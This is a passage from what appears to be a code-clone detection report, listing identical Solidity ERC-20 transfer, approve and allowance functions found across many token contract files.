    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="83" endline="86" pcid="4080">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="82" endline="85" pcid="6153">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0bdce6ba4c10f8e509b02382066e5402b97a7c80.sol" startline="1509" endline="1512" pcid="316">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="83" endline="86" pcid="5786">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="73" endline="76" pcid="5784">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="70" endline="73" pcid="7652">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="73" endline="76" pcid="308">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5ba66281ec78ee1a83e7a449d1692b0fda7023e2.sol" startline="80" endline="83" pcid="3503">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="79" endline="82" pcid="8007">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="74" endline="77" pcid="1832">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="87" endline="90" pcid="406">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="74" endline="77" pcid="4933">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="76" endline="79" pcid="8470">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="77" endline="80" pcid="6913">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc0df2A6330877c7632051E2A30e8Eb732fa1aE02.sol" startline="67" endline="70" pcid="6911">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="80" endline="83" pcid="7838">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="83" endline="86" pcid="128">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x837c26F4D6Be1E7466Fe92fE138b8c4af8C59D0C.sol" startline="84" endline="87" pcid="4935">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="74" endline="77" pcid="1401">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="71" endline="74" pcid="5705">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="85" endline="88" pcid="4243">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="71" endline="74" pcid="7930">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="67" endline="70" pcid="976">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="71" endline="74" pcid="7503">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="82" endline="85" pcid="4019">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="84" endline="87" pcid="1403">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="184" endline="187" pcid="3747">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="81" endline="84" pcid="5707">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="82" endline="85" pcid="963">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="74" endline="77" pcid="2435">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="80" endline="83" pcid="5767">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="68" endline="71" pcid="1431">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="70" endline="73" pcid="5720">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="80" endline="83" pcid="5722">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="83" endline="86" pcid="4971">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="70" endline="73" pcid="5765">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="74" endline="77" pcid="4948">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="82" endline="85" pcid="7962">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="73" endline="76" pcid="4969">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="75" endline="78" pcid="4348">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="70" endline="73" pcid="9208">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="81" endline="84" pcid="3151">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="84" endline="87" pcid="4950">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="82" endline="85" pcid="1418">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="70" endline="73" pcid="5735">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="84" endline="87" pcid="877">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="80" endline="83" pcid="5752">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75780415fCA0157e4814A1A2588f1eE9Ff0F7E88.sol" startline="85" endline="88" pcid="4350">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="71" endline="74" pcid="9278">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="78" endline="81" pcid="2526">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1553F94Cc349AaCa6c1f70707740e48d14f2632D.sol" startline="34" endline="37" pcid="604">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="75" endline="78" pcid="991">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="70" endline="73" pcid="5750">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="72" endline="75" pcid="1416">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="72" endline="75" pcid="248">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="267" endline="270" pcid="1981">
    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="80" endline="83" pcid="5737">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="75" endline="78" pcid="4241">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="70" endline="73" pcid="8245">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="84" endline="87" pcid="6898">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="81" endline="84" pcid="2377">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="85" endline="88" pcid="2251">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="84" endline="87" pcid="163">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="248" endline="251" pcid="1979">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="700" endline="703" pcid="8079">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="70" endline="73" pcid="8320">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="74" endline="77" pcid="6896">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
</class>

<class classid="3" nclones="526" nlines="3" similarity="100">
<source file="systems/source-code/0x0000Db4632C8Ca4DD7E3C570397012cCBf57045b.sol" startline="42" endline="44" pcid="5">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="80" endline="82" pcid="8411">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xd1f939d7de311a475d3d97f2dadb1943dd1bb555.sol" startline="79" endline="81" pcid="7519">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="456" endline="458" pcid="7772">
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="78" endline="80" pcid="5517">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="77" endline="79" pcid="6336">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="76" endline="78" pcid="8261">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="77" endline="79" pcid="2645">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="79" endline="81" pcid="1684">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="81" endline="83" pcid="2201">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x25247a283047f964638be79886b61af12d3fe568.sol" startline="61" endline="63" pcid="1173">
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="77" endline="79" pcid="1417">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="78" endline="80" pcid="943">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xdf2b11D6589a98Cf77e8e91B78cE8f2beB3dcbf5.sol" startline="74" endline="76" pcid="8006">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="78" endline="80" pcid="7167">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="74" endline="76" pcid="4287">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x30d560986fc2269db4935ef6450ae641111fa0ff.sol" startline="44" endline="46" pcid="1537">
    function allowance(address owner, address spender) public view returns (uint256) {
        return z[owner][spender];
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="75" endline="77" pcid="4844">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="78" endline="80" pcid="6052">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf157af38701777fc54f34bf6ccde57bb1c364fae.sol" startline="58" endline="60" pcid="8824">
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="77" endline="79" pcid="2542">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="78" endline="80" pcid="6321">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="79" endline="81" pcid="806">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="79" endline="81" pcid="4212">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="78" endline="80" pcid="8601">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="80" endline="82" pcid="732">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="79" endline="81" pcid="4632">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="79" endline="81" pcid="2737">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="77" endline="79" pcid="520">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="78" endline="80" pcid="5785">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="76" endline="78" pcid="2376">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="80" endline="82" pcid="8724">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="76" endline="78" pcid="4389">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="78" endline="80" pcid="2963">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="150" endline="152" pcid="3742">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="75" endline="77" pcid="9194">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="75" endline="77" pcid="7152">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="75" endline="77" pcid="8814">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="78" endline="80" pcid="3669">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="76" endline="78" pcid="1163">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="74" endline="76" pcid="2690">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2C898DEc3Fb5e548b771E1A2DA4230ea7989BFF9.sol" startline="75" endline="77" pcid="1311">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="78" endline="80" pcid="1296">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="695" endline="697" pcid="8078">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="420" endline="422" pcid="6408">
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="78" endline="80" pcid="4970">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="79" endline="81" pcid="9023">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="78" endline="80" pcid="5942">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="80" endline="82" pcid="2421">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="76" endline="78" pcid="2767">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="149" endline="151" pcid="7366">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="79" endline="81" pcid="7542">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="75" endline="77" pcid="5721">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="77" endline="79" pcid="1185">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="79" endline="81" pcid="1447">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="81" endline="83" pcid="3622">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="77" endline="79" pcid="3714">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="79" endline="81" pcid="1848">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="75" endline="77" pcid="8021">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="72" endline="74" pcid="3531">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="78" endline="80" pcid="861">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="419" endline="421" pcid="30">
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="76" endline="78" pcid="5094">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="76" endline="78" pcid="214">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="76" endline="78" pcid="8553">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
